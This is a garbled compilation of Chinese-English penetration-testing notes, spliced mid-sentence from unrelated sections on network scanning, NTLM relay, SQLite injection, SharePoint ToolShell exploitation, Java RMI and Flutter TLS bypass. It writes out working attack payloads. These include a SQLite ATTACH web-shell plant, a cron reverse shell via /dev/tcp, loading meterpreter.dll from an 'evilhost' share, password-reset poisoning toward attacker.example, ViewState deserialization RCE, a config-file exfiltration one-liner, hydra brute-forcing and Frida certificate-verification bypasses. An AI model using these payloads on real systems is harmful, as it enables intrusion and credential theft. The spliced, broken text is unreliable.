Combine masscan with the built-in gtpv1 UDP probes to quickly map GTP-C listeners: -w Write raw packets to pcap Important constants inside the binary can be patched to widen scans: With proper firewall hair-pinning, this tunnel bypasses signalling-only VLANs and lands you directly in the data plane. cordscan, GTPDoor, EchoBackdoor, NoDepDNS – custom tooling described in previous sections. FScan : intranet TCP sweeps (fscan -p 22,80,443 10.0.0.0/24) Because the Registration Request is not integrity protected, an on-path attacker can clear capability bits to coerce selection of EEA0/EIA0 later during Security Mode Command. Some stacks wrongly allow null algorithms outside emergency services. Detect rogue or misconfigured infrastructure: unauthorized gNB/AMF, unexpected N2 peers. In environments requiring auth, previously-leaked 凭据 (see below) restore access. Issue: web-served logs (e.g., httpd.log) are reachable unauthenticated under /lang/log/and contain admin login events with the 密码 encrypted using a hardcoded AES key/IV present in client-side JavaScript. Inventory Internet-exposed Milesight routers; restrict management to VPN; disable SMS features unless required; upgrade to ≥ v35.3.0.7; rotate 凭据 and review SMS logs for unknown sends. # 命令 / 载荷 / 操作片段 # 1. 1.1 Default OSS / NE Accounts 1hydra -L usernames.txt -P vendor_telecom_defaults.txt ssh://10.10.10.10 -t 8 -o found.txt # 2. 1.2 Host Discovery inside GRX/IPX 1masscan 10.0.0.0/8 -pU:2123 --rate 50000 --router-ip 10.0.0.254 --router-mac 00:11:22:33:44:55 # 3. Responder is a tool used for poisoning LLMNR, NBT-NS, and mDNS queries, selectively responding based on query types, primarily targeting SMB services. Responder displays captured hashes on the screen and saves them in the /usr/share/responder/logs directory. Techniques to capture NTLMv1 challenges/responses for easier cracking: responder -I <Interface> --lm --disable-ess NetBIOS requests can be resolved to the attacker's IP, and an 认证 proxy can be set up: responder.py -I <interface> -Pv Automatic NTLM session downgrade (ESS): Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off Running the attack: ./Responder.py -I eth0 -Pdv This method can effectively capture NTLMv1/2 hashes, but it requires careful handling to avoid network disruption. Responder/Dementor will impersonate services using the above-mentioned protocols, capturing 凭据 (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the spoofed services. Attempts can be made to downgrade to NetNTLMv1 or disable ESS for easier credential cracking. SMB signing should be disabled. smbrelayx: A Python script for relaying SMB sessions and executing commands or deploying backdoors. MultiRelay: A tool from the Responder suite to relay specific users or all users, execute commands, or dump hashes. Auth improves reliability for HTTPS/LDAPS CBT and MSSQL EPA checks; SMB signing/signature level is probed unauthenticated. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/侦察与枚举/SQLite Injection 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # SQLite Injection 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 SQLite Injection 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 SQLite Injection 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：SQLite Injection、SQLite Comments、SQLite 枚举、SQLite String、SQLite String 方法论；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 SQLite Injection SQLite Comments SQLite 枚举 SQLite String SQLite String 方法论 SQLite Blind SQLite Blind 方法论 SQLite Blind With Substring Equivalent SQlite Error Based SQlite Time Based SQLite Remote Code Execution Attach Database Load extension SQLite File Manipulation SQLite Read File SQLite Write File # 核心要点 This snippet shows how an attacker could abuse SQLite's ATTACH DATABASE feature to plant a web-shell on a server: First, it tells SQLite to "treat" a PHP file as a writable SQLite database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious PHP code into the file. If uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the same technique to create a cron job that triggers a 反弹 Shell: This writes a new cron entry that runs every minute and connects back to the attacker. In the sqlite3 command-line shell you can display runtime configuration with: If you see load extension on (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions. # 命令 / 载荷 / 操作片段 # 1. SQlite Error Based 1AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END # 2. SQlite Time Based 12AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) # 3. Attach Database 123ATTACH DATABASE '/var/www/shell.php' AS shell;CREATE TABLE shell.pwn (dataz text);INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');-- # 4. Attach Database 12file shell.phpshell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2 # 5. Attach Database 123ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;CREATE TABLE cron.tab (dataz text);INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));-- # 6. Load extension 1SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');-- # 7. Load extension 12sqlite> .dbconfig load_extension on # 8. Load extension 1gcc -g -fPIC -shared demo.c -o demo.so # 9. SQLite Write File 1SELECT writefile('/path/to/file', column_name) FROM table_name # 工具与参考入口 SQLite3 Injection 速查：Nickosaurus Hax：May 31, 2012 # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 SQL 注入 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

You should read some tricks about physical attacks and others about escaping from GUI applications. For external scopes it usually pays off to build a validated asset list first and only then start scanning. A common 2025 workflow is: For the long version of the 侦察 phase check External 侦察 方法论. Before attacking a host maybe you prefer to steal some 凭据 from the network or sniff some data to learn passively/actively(MitM) what can you find inside the network. You can read Pentesting Network. content: 来源路径： 02-知识点/侦察与枚举/Pentesting Network 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pentesting Network 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Pentesting Network 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Pentesting Network 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Pentesting Network、Discovering hosts from the outside、ICMP、TCP Port Discovery、HTTP Port Discovery；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pentesting Network Discovering hosts from the outside ICMP TCP Port Discovery HTTP Port Discovery UDP Port Discovery SCTP Port Discovery Pentesting Wifi Discovering hosts from the inside Passive Active Active ICMP Wake On Lan Scanning Hosts TCP UDP SCTP Scan IDS and IPS 规避 # 核心要点 Then, what you need is a fast port scanner (masscan) and a list of the ports more used: Here you can find a nice guide of all the well known Wifi attacks at the time of the writing: Once you have discovered all the IPs (external or internal) you want to scan in depth, different actions can be performed. There are 2 options to scan an UDP port: Send a formatted datagrams to elicit a response from a service (e.g., DNS, DHCP, TFTP, and others, as listed in nmap - 载荷). If you receive a response, then, the port is open. Nmap will mix both options using "-sV" (UDP scans are very slow), but notice that UDP scans are slower than TCP scans: Key Steps of the Attack: VTP Transparent: Doesn't engage in VTP updates but forwards VTP announcements. Unaffected by VTP attacks, it maintains a constant revision number of zero. Advertisement Request: Issued by a VTP client to request a Summary Advertisement, typically in response to detecting a higher configuration revision number. If you cannot capture BPDU frames on your interfaces, it is unlikely that you will succeed in an STP attack. If the attacker is connected to 2 switches he can be the root of the new tree and all the traffic between those switches will pass through him (a MITM attack will be performed). The attacker's network interface (-i parameter). Respond to All DHCP Requests: Include -R to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected. Active brute-force 密码 grinding via EAP # 命令 / 载荷 / 操作片段 # 1. ICMP 123ping -c 1 199.66.11.4 # 1 echo request to a hostfping -g 199.66.11.0/24 # Send echo requests to rangesnmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests # 2. TCP Port Discovery 12#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24 # 3. HTTP Port Discovery 1masscan -p80,443,8000-8100,8443 199.66.11.0/24 # 4. UDP Port Discovery 123nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24# The -sV will make nmap test each possible known UDP service packet# The "--version-intensity 0" will make nmap only test the most probable # 5. SCTP Port Discovery 12#Probably useless, but it's pretty fast, why not try it?nmap -T4 -sY -n --open -Pn <IP/range> # 6. Passive 123456netdiscover -pp0f -i eth0 -p -o /tmp/p0f.log# Bettercapnet.recon on/off #Read local ARP cache periodicallynet.showset net.show.meta true #more info # 7. Active 1234567891011121314151617#ARP discoverynmap -sn <Network> #ARP Requests (Discover IPs)netdiscover -r <Network> #ARP requests (Discover IPs)#NBT discoverynbtscan -r 192.168.0.1/24 #Search in Domain# Bettercapnet.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSDset net.probe.mdns true/false #Enable mDNS discovery probes (default=true)set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)set net.probe.wsd true/false #Enable WSD discovery probes (default=true)set net.probe.throttle 10 #10ms between probes sent (default=10)#IPv6alive6 <IFACE> # Send a pingv6 to multicast. # 8. Wake On Lan 123# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9 # 9. TCP 123456789# Nmap fast scan for the most 1000tcp ports usednmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP># Nmap fast scan for all the portsnmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP># Nmap fast scan for all the ports slower to avoid failures due to -T4nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>#Bettercap Scansyn.scan 192.168.1.0/24 1 10000 #Ports 1-10000 # 10. Nested parsing unlocks object injection, 批量赋值，NoSQL 注入，and 原型污染 chains if the parsed object is merged into application state Practical 载荷 to try: If the app reflects or persists the resulting object, pivot into the dedicated pages for 利用 details: Bracket syntax such as a [b][c]=1, dotted syntax such as a.b=1, and proto /constructor [prototype] 载荷 密码 reset poisoning and absolute URL poisoning Bypassing IP-based allowlists, rate limits, or audit trails Bypassing route-specific middleware that only checks req.method # 命令 / 载荷 / 操作片段 # 1. Single cookie with a specific name 1cookie-monster -c eyJmb28iOiJiYXIifQ== -s LVMVxSNPdU_G8S3mkjlShUD78s4 -n session # 2. Custom wordlist 1cookie-monster -c eyJmb28iOiJiYXIifQ== -s LVMVxSNPdU_G8S3mkjlShUD78s4 -w custom.lst # 3. Test multiple cookies using batch mode 1cookie-monster -b -f cookies.json # 4. Test multiple cookies using batch mode with a custom wordlist 1cookie-monster -b -f cookies.json -w custom.lst # 5. Encode and sign a new cookie 1cookie-monster -e -f new_cookie.json -k secret # 6. Query String and URL-Encoded Parser Abuse 12345678# Mass assignment style probecurl 'https://target.example/profile?role=admin&isAdmin=true'# Nested object / qs syntaxcurl 'https://target.example/search?user[role]=admin&filters[name][$ne]=x'# URL-encoded body against express.urlencoded({ extended: true })curl -X POST 'https://target.example/api/update' -H 'Content-Type: application/x-www-form-urlencoded' --data 'profile[role]=admin&filters[$ne]=x' # 7. trust proxy Abuse 12345678POST /reset-password HTTP/1.1Host: target.exampleX-Forwarded-Host: attacker.exampleX-Forwarded-Proto: httpsX-Forwarded-For: 127.0.0.1Content-Type: application/json{"email":"victim@target.example"} # 8. Method Override Tunneling 123456POST /users/42 HTTP/1.1Host: target.exampleX-HTTP-Method-Override: DELETEContent-Type: application/x-www-form-urlencodedconfirm=yes # 9. Method Override Tunneling 12345POST /users/42?_method=PUT HTTP/1.1Host: target.exampleContent-Type: application/x-www-form-urlencodedrole=admin # 工具与参考入口 https://github.com/DigitalInterruption/cookie-monster https://expressjs.com/en/guide/behind-proxies.html https://portswigger.net/research/server-side-prototype-pollution # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Nmap Summary (ESP) 技术笔记
content: 来源路径： 02-知识点/侦察与枚举/Nmap Summary (ESP) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Nmap Summary (ESP) 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Nmap Summary (ESP) 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Nmap Summary (ESP) 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Nmap Summary (ESP)、Parameters、IPs to scan、Equipment discovery、Port scanning techniques；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Nmap Summary (ESP) Parameters IPs to scan Equipment discovery Port scanning techniques Focus Analysis Recent Practical Notes (7.94+) Speed Up Nmap Service scan x16 Build a static Nmap for restricted environments # 核心要点 -sS: Does not complete the connection so it leaves no trace, very good if it can be used.(privileges) It is the one used by default. -sT: Completes the connection, so it does leave a trace, but it can be used for sure. By default without privileges. -sM: Maimon scan: Sends FIN and ACK flags, used for BSD, currently will return all as closed. --badsum: It sends the sum wrong, the computers would discard the packets, but the firewalls could answer something, it is used to detect firewalls. -sZ: "Weird" SCTP scanner, when sending probes with cookie echo fragments they should be dropped if open or responded with ABORT if closed. It can pass through firewalls that init does not pass through, the bad thing is that it does not distinguish between filtered and open. -sO: Protocol Ip scan. Sends bad and empty headers in which sometimes not even the protocol can be distinguished. If ICMP unreachable protocol arrives it is closed, if unreachable port arrives it is open, if another error arrives, filtered, if nothing arrives, open|filtered. -sV Version scanning, intensity can be regulated from 0 to 9, default is 7. --version-intensity <number> We regulate the intensity, so that the lower it is, it will only launch the most probable probes, but not all. With this, we can considerably shorten UDP scanning time --allports Forces version 检测 on ports excluded by nmap-service-probes (notably TCP/9100). Be careful: on some printers or raw socket listeners this can make them print the probe data. -O OS 检测 --osscan-limit For proper host scanning, at least one open port and one closed port are needed. If this condition isn't met and we've set this, it won't attempt OS prediction (saves time) --osscan-guess When OS 检测 isn't perfect, this makes it try harder Auth: executes all available 认证 scripts Default: executes basic default tool scripts # 命令 / 载荷 / 操作片段 # 1. Nmap Summary (ESP) 1nmap -sV -sC -O -n -oA nmapscan 192.168.0.1/24 # 2. Focus Analysis 12345# Send only XML to stdout for toolingnmap -sV -oX - 10.10.10.0/24# Portable HTML-friendly XMLnmap -sV --webxml -oX scan.xml 10.10.10.10 # 3. Focus Analysis 1nmap -sV --script vulners --script-args mincvss=7.0 <IP> # 4. Build a static Nmap for restricted environments 123uname -a# If building from macOS/ARM/etc., pin the builder arch:docker run --rm --platform=linux/amd64 -v "$(pwd)":/out -w /tmp ubuntu:22.04 bash -lc 'echo ok' # 5. Build a static Nmap for restricted environments 12345set -euo pipefailexport DEBIAN_FRONTEND=noninteractiveapt-get update && apt-get install -y --no-install-recommends \ build-essential ca-certificates curl bzip2 xz-utils pkg-config perl python3 file git \ automake autoconf libtool m4 zlib1g-dev # 6. Build a static Nmap for restricted environments 123456OSSL="1.1.1w"curl -fsSLO "https://www.openssl.org/source/openssl-$OSSL.tar.gz"tar xzf "openssl-$OSSL.tar.gz" && cd "openssl-$OSSL"./Configure no-shared no-zlib linux-x86_64 -static --prefix=/opt/osslmake -j"$(nproc)" && make install_swcd /tmp # 7. Build a static Nmap for restricted environments 123456PCRE2=10.43curl -fsSLO "https://github.com/PCRE2Project/pcre2/releases/download/pcre2-$PCRE2/pcre2-$PCRE2.tar.bz2"tar xjf "pcre2-$PCRE2.tar.bz2" && cd "pcre2-$PCRE2"./configure --disable-shared --enable-static --prefix=/opt/pcre2make -j"$(nproc)" && make installcd /tmp # 8. Build a static Nmap for restricted environments 12345678910111213141516NMAP=7.98curl -fsSLO "https://nmap.org/dist/nmap-$NMAP.tar.bz2"tar xjf "nmap-$NMAP.tar.bz2" && cd "nmap-$NMAP"export CPPFLAGS="-I/opt/ossl/include -I/opt/pcre2/include"export LDFLAGS="-L/opt/ossl/lib -L/opt/pcre2/lib -static -static-libstdc++ -static-libgcc"export LIBS="-lpcre2-8 -ldl -lpthread -lz"./configure \ --with-openssl=/opt/ossl \ --with-libpcre=/opt/pcre2 \ --with-libpcap=included \ --with-libdnet=included \ --without-zenmap --without-ndiff --without-nmap-update# Avoid building shared libpcap by accidentsed -i -e "s/^shared: /shared: #/" li

content: 来源路径： 02-知识点/侦察与枚举/Microsoft SharePoint – Pentesting & 利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Microsoft SharePoint – Pentesting & 利用 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Microsoft SharePoint – Pentesting & 利用 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Microsoft SharePoint – Pentesting & 利用 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Quick 枚举、2025 利用 chain (a.k.a. “ToolShell”)、2.1 CVE-2025-49704 – 代码注入 on ToolPane.aspx、2.2 CVE-2025-49706 – Improper 认证 绕过、2.3 CVE-2025-53770 – Unauthenticated ViewState Deserialization → RCE；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Quick 枚举 2025 利用 chain (a.k.a. “ToolShell”) 2.1 CVE-2025-49704 – 代码注入 on ToolPane.aspx 2.2 CVE-2025-49706 – Improper 认证 绕过 2.3 CVE-2025-53770 – Unauthenticated ViewState Deserialization → RCE 2.4 CVE-2025-53771 – 路径穿越 /web.config Disclosure 2.5 ToolShell workflow observed in Ink Dragon intrusions Post - 利用 recipes observed in the wild 3.1 Exfiltrate every .config file (variation-1) 3.2 Deploy a Base64-encoded ASPX web shell (variation-2) 3.3 Obfuscated variant (variation-3) 3.4 AK47C2 multi-protocol backdoor & X2ANYLOCK ransomware (observed 2025-2026) AK47C2 – dnsclient variant AK47C2 – httpclient variant X2ANYLOCK ransomware DLL side-loading chain 3.5 Turning SharePoint loot into 横向移动 3.6 持久化 patterns witnessed in 2025 intrusions # 核心要点 /layouts/15/ToolPane.aspx?PageView=…&DefaultWebPartId=<载荷> allows arbitrary Server-Side Include code to be injected in the page which is later compiled by ASP.NET. An attacker can embed C# that executes Process.Start() and drop a malicious ViewState. The same page trusts the X-Forms BaseUrl header to determine the site context. By pointing it to / layouts/15/, MFA/SSO enforced at the root site can be bypassed unauthenticated. Once the attacker controls a gadget in ToolPane.aspx they can post an unsigned (or MAC-only) VIEWSTATE value that triggers .NET deserialization inside w3wp.exe leading to code execution. If signing is enabled, steal the ValidationKey/DecryptionKey from any web.config (see 2.4) and forge the 载荷 with ysoserial.net or ysodom: For an in-depth explanation on abusing ASP.NET ViewState read: ../../pentesting-web/deserialization/exploiting- viewstate-parameter.md Immediate staging – successful 利用 drops a loader or PowerShell stager that: (1) dumps every web.config, (2) plants an ASPX webshell for contingency access, and (3) schedules a local Potato privesc to escape the IIS worker. Thread.Sleep (<ms>) added for sandbox - 规避 & timing-based AV 绕过. Arbitrary shell command execution. 64-bit C++ 载荷 loaded through DLL side-loading (see below). Recursively encrypts local drives and discovered SMB shares; skips system paths. Abuse leaked <machineKey> values internally – even if the internet perimeter gets patched, reusing the same validationKey/decryptionKey allows lateral ViewState 利用 between internal SharePoint zones that trust each other. IIS post - 利用 & web.config abuse: # 命令 / 载荷 / 操作片段 # 1. Quick 枚举 1234567891011121314# favicon hash and keywordscurl -s https://<host>/_layouts/15/images/SharePointHome.pngcurl -s https://<host>/_vti_bin/client.svc | file - # returns WCF/XSI# version leakage (often in JS)curl -s https://<host>/_layouts/15/init.js | grep -i "spPageContextInfo"# interesting standard paths/_layouts/15/ToolPane.aspx # vulnerable page used in 2025 exploit chain/_vti_bin/Lists.asmx # legacy SOAP service/_catalogs/masterpage/Forms/AllItems.aspx# enumerate sites & site-collections (requires at least Anonymous)python3 Office365-ADFSBrute/SharePointURLBrute.py -u https://<host> # 2. 2.3 CVE-2025-53770 – Unauthenticated ViewState Deserialization → RCE 12ysoserial.exe -g TypeConfuseDelegate -f Json.Net -o raw -c "cmd /c whoami" | ViewStateGenerator.exe --validation-key <hex> --decryption-key <hex> -o payload.txt # 3. 3.1 Exfiltrate every .config file (variation-1) 1cmd.exe /c for /R C:\inetpub\wwwroot %i in (*.config) do @type "%i" >> "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\debug_dev.js" # 4. 3.2 Deploy a Base64-encoded ASPX web shell (variation-2) 1powershell.exe -EncodedCommand <base64> # 5. 3.2 Deploy a Base64-encoded ASPX web shell (variation-2) 12<%@ Page Language="C#" %><%@ Import Namespace="System.Security.Cryptography" %> # 6. 3.2 Deploy a Base64-encoded ASPX web shell (variation-2) 1C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx # 7. content: 来源路径： 02-知识点/侦察与枚举/Java RMI 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Java RMI 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Java RMI 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Java RMI 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Java RMI、工具、检测、方法论、RCE using beanshooter；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Java RMI 工具 检测 方法论 RCE using beanshooter RCE using sjet or mjet Requirements Remote Command Execution RCE using Metasploit # 核心要点 siberas/sjet：siberas JMX 利用 toolkit mogwailabs/mjet：MOGWAI LABS JMX 利用 toolkit qtc-de/remote-method-guesser：Java RMI 漏洞 Scanner qtc-de/beanshooter：JMX 枚举 and attacking tool. Example: noseyparker scan --datastore np.db <path|repo> then noseyparker report --datastore np.db. ggshield (GitGuardian CLI) provides pre-commit/CI hooks and Docker image scanning: ggshield secret scan repo <path-or-url>. content: 来源路径： 02-知识点/侦察与枚举/Flutter 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Flutter 技术笔记 [!summary] 提炼定位 面向 侦察与枚举 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Flutter 技术笔记 建立资产、入口、服务、身份或技术栈线索。 先被动收集，再主动验证；把可复现证据沉淀为后续攻击面。 # 中文提炼 核心目标是把 Flutter 技术笔记 转化为可验证资产或服务线索，而不是停留在未确认情报。 优先关注：Flutter、Intercepting HTTPS traffic in Flutter、Why HTTPS interception is tricky in Flutter、Fingerprint the exact Flutter stack、Target: ssl 密码学 x509 session verify cert chain ()；每条发现都要标注来源、时间、目标和可信度。 主动探测前先去重和收敛范围，避免把 CDN、第三方 SaaS 或无授权资产混入后续验证。 输出应沉淀为资产清单、服务清单、指纹差异和下一步验证入口。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Flutter Intercepting HTTPS traffic in Flutter Why HTTPS interception is tricky in Flutter Fingerprint the exact Flutter stack Target: ssl 密码学 x509 session verify cert chain () Option A – Binary patching with reFlutter Option B – Live hooking with Frida (the “hard-core” path) Forcing traffic through your proxy Quick Flutter TLS 绕过 workflow (Frida Codeshare + system CA) Offset-based hook of BoringSSL verification (no signature scan) Reversing the Dart 载荷 (libapp.so) Quick static triage Recovering symbols, strings and hook points with blutter Platform / MethodChannel 侦察 Obfuscation notes for pentesters # 核心要点 Flutter is Google’s cross-platform UI toolkit that lets developers write a single Dart code-base which the Engine (native C/C++) turns into platform-specific machine code for Android & iOS. SSL/TLS verification lives two layers down in BoringSSL, so Java SSL‐pinning bypasses don’t touch it. Symbols in libflutter.so are stripped & mangled, hiding the certificate-verification function from dynamic 工具. Get snapshot 哈希 | python3 get snapshot 哈希.py libapp.so | adb4292f3ec25… Map 哈希 → Engine | enginehash list in reFlutter | Flutter 3 · 7 · 12 + engine commit 1a65d409… Find get snapshot 哈希.py here. Returns bool – a single true is enough to 绕过 the whole certificate chain check. Signature scans can succeed on ARM but miss on x86 64 because the opcode layout changes; this offset method is architecture-agnostic as long as you recalc the RVA. This 绕过 causes BoringSSL to accept any chain, enabling HTTPS MITM regardless of pins/CA trust inside Flutter. libapp.so is the AOT-compiled Dart 载荷. # 命令 / 载荷 / 操作片段 # 1. Option B – Live hooking with Frida (the “hard-core” path) 123456789101112131415// attach & locate libflutter.sovar flutter = Process.getModuleByName("libflutter.so");// x86-64 pattern of the first 16 bytes of ssl_crypto_x509_session_verify_cert_chainvar sig = "55 41 57 41 56 41 55 41 54 53 48 83 EC 38 C6 02";Memory.scan(flutter.base, flutter.size, sig, { onMatch: function (addr) { console.log("[+] found verifier at " + addr); Interceptor.attach(addr, { onLeave: function (retval) { retval.replace(0x1); } // always 'true' }); }, onComplete: function () { console.log("scan done"); }}); # 2. Option B – Live hooking with Frida (the “hard-core” path) 1frida -U -f com.example.app -l bypass.js # 3. Quick Flutter TLS 绕过 workflow (Frida Codeshare + system CA) 12adb push frida-server-17.0.5-android-x86_64 /data/local/tmp/frida-serveradb shell "su -c 'chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &'" # 4. Quick Flutter TLS 绕过 workflow (Frida Codeshare + system CA) 12pip3 install frida-tools --break-system-packagesadb shell pm list packages -f | grep target # 5. Quick Flutter TLS 绕过 workflow (Frida Codeshare + system CA) 1frida -U -f com.example.target --codeshare TheDauntless/disable-flutter-tls-v1 --no-pause # 6. Quick Flutter TLS 绕过 workflow (Frida Codeshare + system CA) 123frida -U -f com.example.target --no-pause \ --codeshare TheDauntless/disable-flutter-tls-v1 \ -l frida4burp.js # 7. Offset-based hook of BoringSSL verification (no signature scan) 123456789101112// frida -U -f com.target.app -l bypass.js --no-pauseconst base = Module.findBaseAddress('libflutter.so');// Example offset from analysis. Recompute per build/arch.const off = ptr('0x02084644');const addr = base.add(off);// ssl_crypto_x509_session_verify_cert_chain: 3 args, bool returnInterceptor.replace(addr, new NativeCallback(function (a, b, c) { return 1; // true}, 'int', ['pointer', 'pointer', 'pointer']));console.log('[+] Hooked BoringSSL verify_cert_chain at', addr); # 8. Offset-based hook of BoringSSL verification (no signature scan) 1iptables -t nat -A OUTPUT -p tcp -j DNAT --to-destination <Burp_IP>:<Burp_Port> # 9. Quick static triage 123unzip -l target.apk | grep -E "(libflutter|libapp|flutter_assets|kernel_blob)"unzip -j target.apk "lib/arm64-v8a/libapp.so" "lib/arm64-v8a/libflutter.so" -d extracted_libs/strings extracted_libs/libflutter.so | grep -E "^[0-9]+\.[0-9]+\.[0-9]+" | head # 10. Rogue infra quick note Windows supplicant misconfig pitfalls (GUI/GPO) # 核心要点 Broken client server-validation: if the supplicant doesn’t strictly verify the RADIUS server certificate (or allows users to click through warnings), a rogue AP with a self-signed cert can still onboard victims – turning mutual TLS into one-way TLS. Impact: fast, no-auth username collection → fuels 密码 spraying, phishing, account correlation. Worse when usernames match email addresses. Rogue APs broadcasting the corporate SSID can present any certificate. If the client: Verify the server's identity by validating the certificate Strict validation + no prompts → rogue cert rejected; Windows logs an event and TLS fails (good 检测 signal). # 命令 / 载荷 / 操作片段 # 1. Unauthenticated EAP identity leakage /username 枚举 123456# 1) Park on the right channel/BSSIDairodump-ng -i $IFACE -c $CHAN --bssid $BSSID# 2) Decode EAP frames and extract identities# Trigger a client connection (e.g., your phone) to see the 